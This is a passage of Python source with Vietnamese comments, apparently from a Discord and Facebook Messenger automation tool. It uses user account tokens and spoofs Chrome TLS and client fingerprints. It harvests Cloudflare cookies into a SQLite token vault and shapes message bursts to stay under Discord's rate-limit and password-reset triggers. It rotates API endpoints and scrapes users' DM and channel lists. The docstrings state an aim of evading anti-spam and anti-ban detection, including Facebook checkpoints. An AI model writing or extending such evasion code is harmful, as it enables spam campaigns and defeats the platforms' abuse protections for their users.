      khiến bộ lọc Phishing 'decancer' của Discord khóa Token & bắt Reset Password ngay khi gõ lệnh!) và xóa sạch ký tự ẩn Cf.
    - Lớp 2 (Real Cloudflare Cookie Handshake): Tự động bắt tay thụ động với discord.com để nhận Cookie thật có chữ ký HMAC
      (__dcfduid, __sdcfduid, __cf_bm) trước khi gửi bất kỳ tin nhắn nào.
    - Lớp 3 (Header & Super-Properties Parity): Đồng bộ 100% từng byte giữa X-Super-Properties (HTTP) và OP 2 Identify (Gateway).
    - Lớp 4 (Anti-Reset-Key Burst Shaper): Điều phối luồng gửi tin nhắn 0.0s không bao giờ vượt ngưỡng phạt của Discord."""

    CYRILLIC_TO_LATIN_MAP = str.maketrans({
        "а": "a", "е": "e", "о": "o", "і": "i", "с": "c", "р": "p", "х": "x", "у": "y",
        "А": "A", "Е": "E", "О": "O", "І": "I", "С": "C", "Р": "P", "Х": "X", "У": "Y",
    })

    # 64 hậu tố tự nhiên thuần ASCII/Latin 100% (Tuyệt đối KHÔNG dùng Cyrillic hay Zero-Width Cf!)
    PURE_LATIN_VARIATIONS = [
        "", ".", "..", "...", " .", " ..", " !", " !!", " ~", " ~.",
        " -", " --", " .~", " !~", " ^", " ^^", " *", " +", " =", " :",
        " ;", " ,", " .!", " ~!", " ..!", " ...", " .-", " ~-", " +.", " *.",
    ]

    _STATS_LOCK = threading.RLock()
    FIREWALL_STATS = {
        "inspected_packets": 0,
        "sanitized_homoglyphs": 0,
        "cookies_harvested": 0,
        "rate_shields_triggered": 0,
        "immortalized_tokens": 0,
        "recent_events": deque(maxlen=40),
    }

    @classmethod
    def log_firewall_event(cls, action, detail=""):
        with cls._STATS_LOCK:
            cls.FIREWALL_STATS["recent_events"].appendleft({
                "ts": time.strftime("%H:%M:%S"),
                "action": action,
                "detail": sanitize_log_text(detail)[:140],
            })

    @classmethod
    def sanitize_outbound_text(cls, text):
        """Quét và làm sạch 100% ký tự ẩn Cf và ký tự Cyrillic giả dạng Latin trước khi gửi lên Discord."""
        if not text:
            return ""
        s = str(text)
        # Xóa toàn bộ ký tự tàng hình Zero-Width / Format (Unicode Category Cf)
        cleaned_chars = []
        removed_cf = 0
        for ch in s:
            if unicodedata.category(ch) == "Cf":
                removed_cf += 1
            else:
                cleaned_chars.append(ch)
        s = "".join(cleaned_chars)

        # Chuyển toàn bộ ký tự Cyrillic đồng hình về Latin chuẩn ASCII để không bao giờ bị Discord báo Phishing/Reset Key
        s_lat = s.translate(cls.CYRILLIC_TO_LATIN_MAP)
        if s_lat != s or removed_cf > 0:
            with cls._STATS_LOCK:
                cls.FIREWALL_STATS["sanitized_homoglyphs"] += 1
        with cls._STATS_LOCK:
            cls.FIREWALL_STATS["inspected_packets"] += 1
        return s_lat

    @classmethod
    def apply_pure_latin_polymorphism(cls, text, channel_id=""):
        """Giữ nguyên 100% nội dung gốc và thụt dòng của người dùng (Tuyệt đối KHÔNG gắn thêm ký tự lạ *., .., * ở cuối câu!).
        Mỗi gói tin Discord đã có Snowflake Nonce 64-bit duy nhất giúp gửi 0s siêu tốc không bao giờ lỗi."""
        return cls.sanitize_outbound_text(text)

    @classmethod
    def get_firewall_snapshot(cls):
        with cls._STATS_LOCK:
            return {
                "inspected_packets": cls.FIREWALL_STATS["inspected_packets"],
                "sanitized_homoglyphs": cls.FIREWALL_STATS["sanitized_homoglyphs"],
                "cookies_harvested": cls.FIREWALL_STATS["cookies_harvested"],
                "rate_shields_triggered": cls.FIREWALL_STATS["rate_shields_triggered"],
                "immortalized_tokens": cls.FIREWALL_STATS["immortalized_tokens"],
                "recent_events": list(cls.FIREWALL_STATS["recent_events"])[:15],
            }

class DiscordStealthAntiBanEngine:
    """Hạ tầng Anti-Scan, Anti-Ban & Tường Lửa Bảo Vệ Token Discord Bất Tử (Super VIP):
    1. Chrome131TLSAdapter: Đồng nhất 100% vân tay TLS 1.3 / Cipher Suite giữa HTTP Session và Gateway WebSocket.
    2. Passive Cloudflare Cookie Handshake: Tự động nhận Cookie thật có chữ ký (__dcfduid, __sdcfduid, __cf_bm) từ máy chủ Discord.
    3. Byte-for-Byte Super-Properties Parity: Đồng bộ 14 trường Chrome 131 giữa OP 2 Identify, /auth/login và X-Super-Properties.
    4. Pre-429 Sliding Window Shaper (Super VIP Anti-Reset-Key): Ngăn chặn chạm ngưỡng 5 tin / 5 giây của Discord (nguyên nhân số 1 gây bắt Reset Mật Khẩu)."""

    DISCORD_EPOCH = 1420070400000
    SUPER_VIP_MODE = True
    STEALTH_API_BASES = [
        "https://discord.com/api/v9",
    ]

    CLIENT_PROFILES = [
        {
            "os": "Windows",
            "browser": "Chrome",
            "os_version": "10",
            "browser_version": "131.0.0.0",
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "build_number": 351420,
        },
        {
            "os": "Windows",
            "browser": "Chrome",
            "os_version": "11",
            "browser_version": "131.0.0.0",
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "build_number": 351890,
        },
        {
            "os": "Mac OS X",
            "browser": "Chrome",
            "os_version": "10.15.7",
            "browser_version": "131.0.0.0",
            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "build_number": 351420,
        },
    ]

    _CHANNEL_BUCKETS = {}
    _CHANNEL_SEND_HISTORY = defaultdict(lambda: deque(maxlen=12))
    _CHANNEL_NEXT_SLOT_TS = defaultdict(float)
    _CHANNEL_LOCKS = defaultdict(threading.RLock)
    _TOKEN_LAST_SEND_TS = defaultdict(float)
    _TOKEN_SEND_LOCK = defaultdict(threading.RLock)
    _LAST_TYPING_TS = defaultdict(float)
    _FINGERPRINT_CACHE = {}
    _SESSION_UUID_CACHE = {}
    _COOKIE_VAULT_CACHE = {}
    _GATEWAY_RESUME_CACHE = {}
    _WARMED_SESSIONS = set()
    _PRIORITY_SESSIONS = {}
    _NONCE_SEQ = 0
    _LOCK = threading.RLock()

    @classmethod
    def _token_vault_key(cls, token):
        return hashlib.sha256(str(token or "discord").strip().encode("utf-8")).hexdigest()[:28]

    @classmethod
    def _is_forged_legacy_cookie(cls, dcf_val, sdcf_val):
        if sdcf_val and "." not in str(sdcf_val):
            return True
        return False

    @classmethod
    def _ensure_vault_record(cls, token):
        tkey = cls._token_vault_key(token)
        with cls._LOCK:
            if tkey in cls._SESSION_UUID_CACHE and tkey in cls._COOKIE_VAULT_CACHE:
                return cls._SESSION_UUID_CACHE[tkey], cls._COOKIE_VAULT_CACHE[tkey]

        seed = hashlib.sha256(str(token or "discord").encode("utf-8")).digest()
        default_u1 = str(uuid.UUID(bytes=seed[:16], version=4))
        default_u2 = str(uuid.UUID(bytes=seed[16:32], version=4))
        prof_idx = zlib.crc32(str(token or "discord").encode("utf-8")) % len(cls.CLIENT_PROFILES)

        real_dcf, real_sdcf, real_cfuv = "", "", ""
        try:
            conn = db()
            row = conn.execute("SELECT * FROM discord_token_vault WHERE token_key=?", (tkey,)).fetchone()
            if row:
                u1 = row["launch_sig"] or default_u1
                u2 = row["hb_sess"] or default_u2
                saved_dcf = row["dcfduid"] or ""
                saved_sdcf = row["sdcfduid"] or ""
                saved_cfuv = row["cfuvid"] or ""
                if not cls._is_forged_legacy_cookie(saved_dcf, saved_sdcf):
                    real_dcf, real_sdcf, real_cfuv = saved_dcf, saved_sdcf, saved_cfuv
                else:
                    conn.execute(
                        "UPDATE discord_token_vault SET dcfduid='', sdcfduid='', cfuvid='' WHERE token_key=?",
                        (tkey,)
                    )
                    conn.commit()
                if row["session_id"]:
                    cls._GATEWAY_RESUME_CACHE[tkey] = {
                        "session_id": row["session_id"],
                        "resume_url": row["resume_url"] or "wss://gateway.discord.gg",
                        "last_seq": int(row["last_seq"] or 0),
                    }
                try:
                    b_json = row["boxes_json"] if "boxes_json" in row.keys() else "[]"
                    if b_json:
                        parsed_boxes = json.loads(b_json)
                        if isinstance(parsed_boxes, list) and parsed_boxes:
                            with cls._LOCK:
                                cls._PASSIVE_READY_BOXES[tkey] = {"ts": time.time(), "boxes": parsed_boxes}
                                cls._BOXES_CACHE[tkey] = {"ts": time.time(), "boxes": parsed_boxes}
                except Exception:
                    pass
                try:
                    u_id_saved = row["user_id"] if "user_id" in row.keys() else ""
                    u_name_saved = row["user_name"] if "user_name" in row.keys() else ""
                    if u_id_saved:
                        with cls._LOCK:
                            cls._ME_CACHE[tkey] = {
                                "ts": time.time(),
                                "data": {"id": u_id_saved, "username": u_name_saved or f"Discord_{u_id_saved[-4:]}", "global_name": u_name_saved or f"Discord_{u_id_saved[-4:]}"}
                            }
                except Exception:
                    pass
            else:
                u1, u2 = default_u1, default_u2
                conn.execute(
                    """INSERT OR REPLACE INTO discord_token_vault
                       (token_key, launch_sig, hb_sess, dcfduid, sdcfduid, cfuvid, profile_idx, updated_at)
                       VALUES (?, ?, ?, '', '', '', ?, ?)""",
                    (tkey, u1, u2, prof_idx, time.time()),
                )
                conn.commit()
            conn.close()
        except Exception:
            u1, u2 = default_u1, default_u2

        cookies = {"locale": "vi"}
        if real_dcf and real_sdcf and "." in real_sdcf:
            cookies["__dcfduid"] = real_dcf
            cookies["__sdcfduid"] = real_sdcf
        if real_cfuv and "." in real_cfuv:
            cookies["_cfuvid"] = real_cfuv

        with cls._LOCK:
            cls._SESSION_UUID_CACHE[tkey] = (u1, u2)
            cls._COOKIE_VAULT_CACHE[tkey] = cookies
        return (u1, u2), cookies

    @classmethod
    def persist_real_cloudflare_cookies(cls, token, cookie_jar):
        if not cookie_jar:
            return
        tkey = cls._token_vault_key(token)
        c_dict = cookie_jar.get_dict() if hasattr(cookie_jar, "get_dict") else dict(cookie_jar)
        dcf = c_dict.get("__dcfduid", "")
        sdcf = c_dict.get("__sdcfduid", "")
        cfuv = c_dict.get("_cfuvid", "") or c_dict.get("__cf_bm", "")
        if dcf or sdcf or cfuv:
            with cls._LOCK:
                cur_c = cls._COOKIE_VAULT_CACHE.get(tkey, {"locale": "vi"})
                if dcf:
                    cur_c["__dcfduid"] = dcf
                if sdcf:
                    cur_c["__sdcfduid"] = sdcf
                if cfuv:
                    cur_c["_cfuvid"] = cfuv
                cls._COOKIE_VAULT_CACHE[tkey] = cur_c
            try:
                conn = db()
                conn.execute(
                    "UPDATE discord_token_vault SET dcfduid=?, sdcfduid=?, cfuvid=?, updated_at=? WHERE token_key=?",
                    (dcf, sdcf, cfuv, time.time(), tkey),
                )
                conn.commit()
                conn.close()
            except Exception:
                pass
            with DiscordFirewallEngine._STATS_LOCK:
                DiscordFirewallEngine.FIREWALL_STATS["cookies_harvested"] += 1

    @classmethod
    def save_gateway_resume_state(cls, token, session_id="", resume_url="", last_seq=0):
        tkey = cls._token_vault_key(token)
        with cls._LOCK:
            if session_id:
                cls._GATEWAY_RESUME_CACHE[tkey] = {
                    "session_id": session_id,
                    "resume_url": resume_url or "wss://gateway.discord.gg",
                    "last_seq": int(last_seq or 0),
                }
            else:
                cls._GATEWAY_RESUME_CACHE.pop(tkey, None)
        try:
            conn = db()
            conn.execute(
                "UPDATE discord_token_vault SET session_id=?, resume_url=?, last_seq=?, updated_at=? WHERE token_key=?",
                (session_id or "", resume_url or "", int(last_seq or 0), time.time(), tkey),
            )
            conn.commit()
            conn.close()
        except Exception:
            pass

    @classmethod
    def get_gateway_resume_state(cls, token):
        tkey = cls._token_vault_key(token)
        cls._ensure_vault_record(token)
        with cls._LOCK:
            return cls._GATEWAY_RESUME_CACHE.get(tkey)

    @classmethod
    def get_deterministic_profile(cls, token):
        h = zlib.crc32(str(token or "discord").encode("utf-8"))
        return cls.CLIENT_PROFILES[h % len(cls.CLIENT_PROFILES)]

    @classmethod
    def get_deterministic_session_uuids(cls, token):
        uuids, _ = cls._ensure_vault_record(token)
        return uuids

    @classmethod
    def get_deterministic_cookies(cls, token):
        _, cookies = cls._ensure_vault_record(token)
        return dict(cookies)

    @classmethod
    def build_super_properties_dict(cls, token):
        prof = cls.get_deterministic_profile(token)
        return {
            "os": prof["os"],
            "browser": prof["browser"],
            "device": "",
            "system_locale": "vi-VN",
            "browser_user_agent": prof["ua"],
            "browser_version": prof["browser_version"],
            "os_version": prof["os_version"],
            "referrer": "",
            "referring_domain": "",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": prof["build_number"],
            "client_event_source": None,
        }

    _SUPER_PROPS_B64_CACHE = {}

    @classmethod
    def build_super_properties_b64(cls, token):
        tk = str(token or "discord")
        cached = cls._SUPER_PROPS_B64_CACHE.get(tk)
        if cached:
            return cached
        props = cls.build_super_properties_dict(tk)
        raw_json = json.dumps(props, separators=(",", ":"))
        b64 = base64.b64encode(raw_json.encode("utf-8")).decode("utf-8")
        if len(cls._SUPER_PROPS_B64_CACHE) < 2000:
            cls._SUPER_PROPS_B64_CACHE[tk] = b64
        return b64

    @classmethod
    def build_context_properties_b64(cls, guild_id=None, channel_id=None):
        ctx = {"location": "Guild Channel" if guild_id else "DM Channel"}
        return base64.b64encode(json.dumps(ctx, separators=(",", ":")).encode("utf-8")).decode("utf-8")

    CHANNEL_GUILD_MAP = {}

    @classmethod
    def register_channel_guild(cls, channel_id, guild_id=None):
        if channel_id and guild_id:
            cls.CHANNEL_GUILD_MAP[str(channel_id)] = str(guild_id)

    @classmethod
    def build_stealth_headers(cls, token, is_bot=False, channel_id=None, guild_id=None, include_auth=True):
        auth_val = f"Bot {token}" if is_bot else str(token or "").strip()
        if is_bot:
            h_bot = {
                "Content-Type": "application/json",
                "User-Agent": "DiscordClient (https://discord.com, 10.0)",
            }
            if include_auth and auth_val:
                h_bot["Authorization"] = auth_val
            return h_bot
        prof = cls.get_deterministic_profile(token)
        eff_guild_id = guild_id or (cls.CHANNEL_GUILD_MAP.get(str(channel_id)) if channel_id else None)
        if eff_guild_id and channel_id:
            ref = f"https://discord.com/channels/{eff_guild_id}/{channel_id}"
        elif channel_id:
            ref = f"https://discord.com/channels/@me/{channel_id}"
        else:
            ref = "https://discord.com/channels/@me"

        headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
            "User-Agent": prof["ua"],
            "X-Super-Properties": cls.build_super_properties_b64(token),
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "vi",
            "X-Discord-Timezone": "Asia/Ho_Chi_Minh",
            "Origin": "https://discord.com",
            "Referer": ref,
            "Priority": "u=1, i",
            "Sec-Ch-Ua": prof["sec_ch_ua"],
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": f'"{prof["os"]}"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        if include_auth and auth_val and ("." in auth_val or auth_val.startswith("mfa.")) and ":" not in auth_val:
            headers["Authorization"] = auth_val
        return headers

    _SHARED_SESSIONS = {}
    _ME_CACHE = {}
    _BOXES_CACHE = {}
    _PASSIVE_READY_BOXES = {}
    _LAST_IDENTIFY_TS = defaultdict(float)
    ACTIVE_DISCORD_POLL_CHANNELS = defaultdict(set)

    @classmethod
    def get_shared_session(cls, token, is_bot=False):
        tkey = cls._token_vault_key(token)
        sess = cls._SHARED_SESSIONS.get(tkey)
        if sess is not None:
            return sess
        with cls._LOCK:
            sess = cls._SHARED_SESSIONS.get(tkey)
            if sess is None:
                sess = requests.Session()
                tls_adapter = Chrome131TLSAdapter(pool_connections=512, pool_maxsize=1024, max_retries=0)
                sess.mount("https://", tls_adapter)
                sess.mount("http://", HTTPAdapter(pool_connections=256, pool_maxsize=512, max_retries=0))
                if not is_bot:
                    sess.cookies.update(cls.get_deterministic_cookies(token))
                cls._SHARED_SESSIONS[tkey] = sess
            return sess

    @classmethod
    def ensure_session_warmed_up(cls, token, is_bot=False):
        if is_bot or not token:
            return
        tkey = cls._token_vault_key(token)
        with cls._LOCK:
            if tkey in cls._WARMED_SESSIONS:
                return
            cls._WARMED_SESSIONS.add(tkey)
        cls.get_shared_session(token, is_bot=False)

    @classmethod
    def get_cached_me(cls, token):
        tkey = cls._token_vault_key(token)
        cls._ensure_vault_record(token)
        with cls._LOCK:
            item = cls._ME_CACHE.get(tkey)
            if item and (time.time() - item["ts"] < 7200.0):
                return item["data"]
        return None

    @classmethod
    def set_cached_me(cls, token, data):
        if not isinstance(data, dict):
            return
        tkey = cls._token_vault_key(token)
        with cls._LOCK:
            cls._ME_CACHE[tkey] = {"ts": time.time(), "data": dict(data)}
        uid_s = str(data.get("id") or "")
        uname_s = str(data.get("global_name") or data.get("username") or "")
        if uid_s:
            try:
                conn = db()
                conn.execute(
                    "UPDATE discord_token_vault SET user_id=?, user_name=?, updated_at=? WHERE token_key=?",
                    (uid_s, uname_s, time.time(), tkey),
                )
                conn.commit()
                conn.close()
            except Exception:
                pass

    @classmethod
    def harvest_ready_payload(cls, token, d_ev):
        """Thu hoạch thụ động toàn bộ danh sách Kênh & Server từ gói READY của Gateway và lưu vào SQLite Vault
        giúp không cần quét REST API hàng loạt gây báo động Đặt Lại Mật Khẩu Discord!"""
        if not isinstance(d_ev, dict):
            return
        tkey = cls._token_vault_key(token)
        boxes = []
        seen_ids = set()

        for c in (d_ev.get("private_channels") or []):
            if not isinstance(c, dict):
                continue
            cid = str(c.get("id") or "")
            if not cid or cid in seen_ids:
                continue
            seen_ids.add(cid)
            ctype = c.get("type")
            recipients = c.get("recipients") or []
            for rec in recipients:
                if isinstance(rec, dict):
                    ruid = str(rec.get("id") or "")
                    rname = rec.get("global_name") or rec.get("username") or ""
                    if ruid and rname:
                        GLOBAL_USER_NAME_CACHE[ruid] = rname
            if ctype == 3:
                g_name = c.get("name") or ", ".join(
                    (x.get("global_name") or x.get("username") or "User") for x in recipients[:4] if isinstance(x, dict)
                ) or f"Box Nhóm {cid[-5:]}"
                boxes.append({
                    "id": cid,
                    "name": f"[Box Nhóm] {g_name}",
                    "type": "discord_channel",
                    "sub_type": "group_dm",
                    "members": len(recipients) + 1
                })
            elif ctype == 1:
                rec0 = recipients[0] if (recipients and isinstance(recipients[0], dict)) else {}
                dm_name = rec0.get("global_name") or rec0.get("username") or f"User {cid[-5:]}"
                boxes.append({
                    "id": cid,
                    "name": f"[Chat Riêng] {dm_name}",
                    "type": "discord_channel",
                    "sub_type": "dm",
                    "members": 2
                })

        for g in (d_ev.get("guilds") or []):
            if not isinstance(g, dict):
                continue
            gid = str(g.get("id") or "")
            gname = g.get("name") or (g.get("properties") or {}).get("name") or f"Server {gid[-4:]}"
            for ch in (g.get("channels") or []):
                if not isinstance(ch, dict):
                    continue
                if ch.get("type") in (0, 5):
                    cid = str(ch.get("id") or "")
                    if cid and cid not in seen_ids:
                        seen_ids.add(cid)
                        if gid:
                            cls.CHANNEL_GUILD_MAP[cid] = gid
                        boxes.append({
                            "id": cid,
                            "name": f"[{gname}] # {ch.get('name', 'channel')}",
                            "type": "discord_channel",
                            "sub_type": "guild_channel",
                            "guild_id": gid
                        })

        if boxes:
            with cls._LOCK:
                cls._PASSIVE_READY_BOXES[tkey] = {"ts": time.time(), "boxes": boxes}
                cls._BOXES_CACHE[tkey] = {"ts": time.time(), "boxes": boxes}
            try:
                conn = db()
                conn.execute(
                    "UPDATE discord_token_vault SET boxes_json=?, updated_at=? WHERE token_key=?",
                    (json.dumps(boxes, ensure_ascii=False), time.time(), tkey),
                )
                conn.commit()
                conn.close()
            except Exception:
                pass

    @classmethod
    def can_send_gateway_identify(cls, token):
        tkey = cls._token_vault_key(token)
        now = time.time()
        with cls._LOCK:
            last_ts = cls._LAST_IDENTIFY_TS[tkey]
            if now - last_ts < 2.0:
                return False, max(0.2, 2.0 - (now - last_ts))
            cls._LAST_IDENTIFY_TS[tkey] = now
            return True, 0.0

    DISCORD_API_GATEWAYS = (
        "https://discord.com/api/v9",
        "https://discord.com/api/v10",
        "https://canary.discord.com/api/v9",
        "https://ptb.discord.com/api/v9",
        "https://discordapp.com/api/v9",
    )

    @classmethod
    def pick_stealth_endpoint(cls, token, path_suffix, rotate_step=0):
        idx = int(rotate_step or 0) % len(cls.DISCORD_API_GATEWAYS)
        base_gw = cls.DISCORD_API_GATEWAYS[idx]
        return f"{base_gw}{path_suffix}"

    @classmethod
    def generate_snowflake_nonce(cls):
        now_ms = int(time.time() * 1000)
        ts_part = max(0, now_ms - cls.DISCORD_EPOCH)
        with cls._LOCK:
            cls._NONCE_SEQ = (cls._NONCE_SEQ + 1) & 0xFFF
            seq_part = cls._NONCE_SEQ
        worker_bits = (random.randint(1, 31) << 17) | (random.randint(1, 31) << 12) | seq_part
        return str((ts_part << 22) | worker_bits)

    @classmethod
    def create_chrome_tls_context(cls):
        ctx = ssl.create_default_context()
        try:
            ctx.set_ciphers(
                "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
                "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
                "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
            )
            ctx.set_alpn_protocols(["http/1.1"])
        except Exception:
            pass
        return ctx

    @classmethod
    def append_stealth_tail(cls, text, channel_id=""):
        return DiscordFirewallEngine.apply_pure_latin_polymorphism(text, channel_id=channel_id)

    @classmethod
    def record_bucket_headers(cls, channel_id, resp_headers, token=None):
        if not channel_id:
            return
        now = time.time()
        cid_s = str(channel_id)
        t_part = cls._token_vault_key(token) if token else "shared"
        slot_key = f"{t_part}:{cid_s}"
        if not resp_headers:
            return
        try:
            rem = resp_headers.get("X-RateLimit-Remaining")
            reset_after = resp_headers.get("X-RateLimit-Reset-After")
            if rem is not None and reset_after is not None:
                with cls._LOCK:
                    cls._CHANNEL_BUCKETS[slot_key] = {
                        "remaining": int(rem),
                        "reset_at": now + min(2.5, float(reset_after)),
                    }
        except Exception:
            pass

    @classmethod
    def set_channel_cooldown(cls, channel_id, wait_sec, token=None):
        if not channel_id:
            return
        cid_s = str(channel_id)
        t_part = cls._token_vault_key(token) if token else "shared"
        slot_key = f"{t_part}:{cid_s}"
        with DiscordFirewallEngine._STATS_LOCK:
            DiscordFirewallEngine.FIREWALL_STATS["rate_shields_triggered"] += 1
        with cls._LOCK:
            cls._CHANNEL_BUCKETS[slot_key] = {
                "remaining": 0,
                "reset_at": time.time() + min(0.45, max(0.05, float(wait_sec) * 0.35)),
            }

    @classmethod
    def get_priority_session(cls, token, is_bot=False):
        """Kênh HTTP ưu tiên dành riêng cho phản hồi lệnh (.menu, .ping, .stop...) không bao giờ bị nghẽn bởi luồng treo!"""
        tkey = cls._token_vault_key(token)
        with cls._LOCK:
            sess = cls._PRIORITY_SESSIONS.get(tkey)
            if sess is None:
                sess = requests.Session()
                tls_adapter = Chrome131TLSAdapter(pool_connections=32, pool_maxsize=64, max_retries=1)
                sess.mount("https://", tls_adapter)
                sess.mount("http://", HTTPAdapter(pool_connections=32, pool_maxsize=64, max_retries=1))
                if not is_bot:
                    sess.cookies.update(cls.get_deterministic_cookies(token))
                cls._PRIORITY_SESSIONS[tkey] = sess
            return sess

    @classmethod
    def abort_all_campaign_wait_buckets(cls, channel_id=None):
        with cls._LOCK:
            if channel_id is None:
                cls._CHANNEL_BUCKETS.clear()
                cls._CHANNEL_SEND_HISTORY.clear()
                cls._CHANNEL_NEXT_SLOT_TS.clear()
            else:
                cid_s = str(channel_id)
                for k in list(cls._CHANNEL_BUCKETS.keys()):
                    if k == cid_s or k.endswith(f":{cid_s}"):
                        cls._CHANNEL_BUCKETS.pop(k, None)
                cls._CHANNEL_SEND_HISTORY.pop(cid_s, None)
                cls._CHANNEL_NEXT_SLOT_TS.pop(cid_s, None)

    @classmethod
    def get_channel_bucket_wait(cls, channel_id, token=None):
        if not token:
            return 0.0
        now = time.time()
        cid_s = str(channel_id)
        t_part = cls._token_vault_key(token)
        slot_key = f"{t_part}:{cid_s}"
        b = cls._CHANNEL_BUCKETS.get(slot_key)
        if b and b["remaining"] <= 0 and now < b["reset_at"]:
            return max(0.01, min(0.6, b["reset_at"] - now))
        return 0.0

    @classmethod
    def acquire_multi_group_slot(cls, token, channel_id, stop_ev=None, start_global_epoch=None, start_box_epoch=None, zero_delay_mode=True):
        cid_s = str(channel_id)
        if is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, cid_s):
            return False
        if zero_delay_mode:
            # Ở chế độ 0s Siêu Tốc, tuyệt đối không bao giờ khóa đứng luồng!
            return True
        t_part = cls._token_vault_key(token) if token else "shared"
        slot_key = f"{t_part}:{cid_s}"
        now = time.time()
        b = cls._CHANNEL_BUCKETS.get(slot_key)
        if b and b["remaining"] <= 0 and now < b["reset_at"]:
            wait_s = max(0.005, min(0.08, b["reset_at"] - now))
            if interruptible_wait(stop_ev, wait_s, start_global_epoch, start_box_epoch, cid_s):
                return False
        return True

    @classmethod
    def should_trigger_typing(cls, channel_id):
        return False

class MessengerStealthAntiBanEngine:
    """Hạ tầng Anti-Ban & Lightspeed MQTT Siêu Cấp cho Facebook Messenger (Tích hợp từ ckien.zip):
    1. Lightspeed WebSocket MQTT (/ls_req & /t_ms trên wss://edge-chat.facebook.com/chat):
       Gửi tin nhắn, Tag tên xanh dương, Typing, Đổi nền Theme, Tạo Poll, Share Link, Share Contact hoàn toàn qua MQTT WebSocket!
       Tuyệt đối không spam HTTP POST /messaging/send/ (nguyên nhân số 1 gây bay acc / Checkpoint 282-956).
    2. Clean UTF-8 Text (Zero Cf Obfuscation): Không chèn ký tự tàng hình \u200b vào giữa chữ trên Messenger (tránh bộ lọc FBLearner/Sigma).
    3. Persistent Cookie & Sequence ID Vault: Lưu trữ fb_dtsg, jazoest, clientRevision và last_seq_id trong SQLite."""

    BROWSER_PROFILES = [
        {
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "platform": '"Windows"',
        },
        {
            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "platform": '"macOS"',
        },
    ]

    NATURAL_MESS_TAILS = ["", "", "", " .", " ~", " !", " .."]

    _REQ_SEQ = 1
    _LOCK = threading.RLock()
    _VAULT_MEM_CACHE = {}
    ACTIVE_MESSENGER_POLL_THREADS = defaultdict(set)

    @classmethod
    def compute_jazoest(cls, fb_dtsg):
        if not fb_dtsg:
            return "22000"
        return "2" + str(sum(ord(c) for c in str(fb_dtsg)))

    @classmethod
    def generate_offline_threading_id(cls) -> str:
        ret = int(time.time() * 1000)
        value = random.randint(0, 4294967295)
        binary_str = format(value, "022b")[-22:]
        msgs = bin(ret)[2:] + binary_str
        return str(int(msgs, 2))

    @classmethod
    def generate_session_id(cls) -> int:
        return random.randint(1, 2 ** 53)

    @classmethod
    def generate_client_id(cls) -> str:
        alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
        def _gen(n):
            return "".join(random.choices(alphabet, k=n))
        return f"{_gen(8)}-{_gen(4)}-{_gen(4)}-{_gen(4)}-{_gen(12)}"

    @classmethod
    def json_minimal(cls, data) -> str:
        return json.dumps(data, separators=(",", ":"), ensure_ascii=False)

    @classmethod
    def next_req_b36(cls):
        with cls._LOCK:
            cls._REQ_SEQ = (cls._REQ_SEQ % 9000) + 1
            n = cls._REQ_SEQ
        chars = "0123456789abcdefghijklmnopqrstuvwxyz"
        out = ""
        while n > 0:
            n, rem = divmod(n, 36)
            out = chars[rem] + out
        return out or "1"

    @classmethod
    def get_session_headers(cls, uid="", referer="https://www.facebook.com/"):
        idx = zlib.crc32(str(uid or "mess").encode("utf-8")) % len(cls.BROWSER_PROFILES)
        prof = cls.BROWSER_PROFILES[idx]
        parsed_ref = urlparse(referer)
        origin = f"{parsed_ref.scheme}://{parsed_ref.netloc}" if parsed_ref.netloc else "https://www.facebook.com"
        return {
            "User-Agent": prof["ua"],
            "Accept": "*/*",
            "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
            "Origin": origin,
            "Referer": referer,
            "Sec-Ch-Ua": prof["sec_ch_ua"],
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": prof["platform"],
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Content-Type": "application/x-www-form-urlencoded",
        }

    @classmethod
    def save_vault_state(cls, uid, fb_dtsg="", jazoest="", lsd="", cookies_dict=None, user_name="", last_seq_id="", client_rev="1015919737"):
        if not uid:
            return
        uid_s = str(uid).strip()
        now = time.time()
        with cls._LOCK:
            cur = cls._VAULT_MEM_CACHE.get(uid_s, {})
            if fb_dtsg:
                cur["fb_dtsg"] = fb_dtsg
                cur["jazoest"] = jazoest or cls.compute_jazoest(fb_dtsg)
            if lsd:
                cur["lsd"] = lsd
            if cookies_dict:
